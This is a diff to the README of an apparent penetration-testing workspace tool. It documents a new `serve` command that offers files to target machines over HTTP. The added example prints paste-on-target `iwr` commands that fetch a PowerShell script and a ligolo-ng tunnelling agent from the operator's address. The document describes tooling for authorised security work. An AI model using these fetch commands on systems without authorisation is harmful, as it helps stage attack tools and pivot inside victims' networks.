@@ -133,6 +133,9 @@ Everything the app prints is indented two spaces, apart from the prompt line, th
 | `path [<folder>]` | Print a folder's full path |
 | `quit` | Leave the shell |
 | `replay [<target>] [<n>]` | List a target's recordings, or play one |
+| `serve [<interface or address>] [<port>]` | Offer the target's upload folder and the tools' files over HTTP |
+| `serve log` | Show the last 20 requests and server lines |
+| `serve stop` | Stop serving files |
 | `status` | Show the box at a glance |
 | `target add` | Add a target to this box |
 | `target edit <target>` | Change a target's addresses or scope |
@@ -169,7 +172,7 @@ vpn/                  copies of the .ovpn files vpn start used; never archived
 targets/
   dc01/
     target.toml       IPs, hostnames, scope
-    creds/  files/  loot/  scans/  exploits/  screenshots/  recordings/
+    creds/  files/  loot/  scans/  exploits/  screenshots/  recordings/  upload/
 ```
 
 Only the app writes `box.toml`, `files.toml` and the rest of the metadata. `finish` and `export` write archives to `~/pwn-broker/wrapped/`. `~/pwn-broker/tools.log` records every tool each box installed and took off ([below](#the-tool-log)).
@@ -403,6 +406,29 @@ tools_index = "~/pwn-shop/dist"
 ```
 
 The app keeps a copy of a downloaded index in `/opt/pwn-broker/cache/`, refreshes it when it is more than a day old and the source answers within two seconds, and otherwise uses what it has. `tool refresh` fetches it now. `tool list`, `tool search` and `tool info` read the index: with a URL index they use the cached copy when the source does not answer in time, and a folder index is read directly. With no index and no cached copy, every `tool` command prints one `fail` line that says where it looked and how to set `tools_index`.
+
+## Serving files
+
+`serve` offers files to the targets over HTTP, from a server that runs in the background until `serve stop`, or until the box that started it is finished. It serves two folders: the current target's `upload/`, for files of your own, and `/opt/pwn-broker/upload/`, where the box's tools put the files meant for a target. It prints the line to paste on the target for each file, `iwr` on a Windows box and `wget` on a Linux one:
+
+```
+forest/dc01 > serve
+
+  ok    serving dc01's upload folder and the tools' files on http://10.10.14.5/k7Qx2p/
+        iwr http://10.10.14.5/k7Qx2p/run.ps1 -OutFile run.ps1
+        iwr http://10.10.14.5/k7Qx2p/ligolo-ng/agent.exe -OutFile agent.exe
+  serve log shows who fetched what; serve stop ends it
+```
+
+- `serve` listens on the tunnel's address. `serve eth0` or `serve 192.168.1.20` names an interface or an address of this machine instead; with no tunnel up and nothing named, it says so and starts nothing. `serve 0.0.0.0` listens on every interface, with a `warn` line.
+- The port is 80 as root and 8000 otherwise; `serve tun0 8080` picks one. A port in use is said at once.
+- Every URL starts with a random part, six letters and digits, chosen each time `serve` starts. A request without it gets `404`, so knowing a tool's file name is not enough to fetch it.
+- Nothing is listed: `/`, the random part and every folder get `404`. Only a file asked for by its exact path is sent. A file whose name starts with a dot, a link, or anything outside the two folders is never sent. A file put in `upload/` after the start is served at once.
+- A name at the top of `upload/` that is also a tool's folder is the tool's.
+- `serve` again while it runs shows the address, the box and target it serves, and the files. Naming another address then is refused: `serve stop` first.
+- `serve log` shows the last 20 lines of `/opt/pwn-broker/run/serve/serve.log`: when it started, then one line per request, with the address that asked, the request and the answer.
+- It outlives `quit` and a closed window. `finish` lists it in its summary as `serving  http://10.10.14.5/   (will be stopped)` and stops it; a server another box started is left alone.
+- `upload/` is part of the box, so whatever you put there is in its archives.
 
 ## Finish, export and import
 
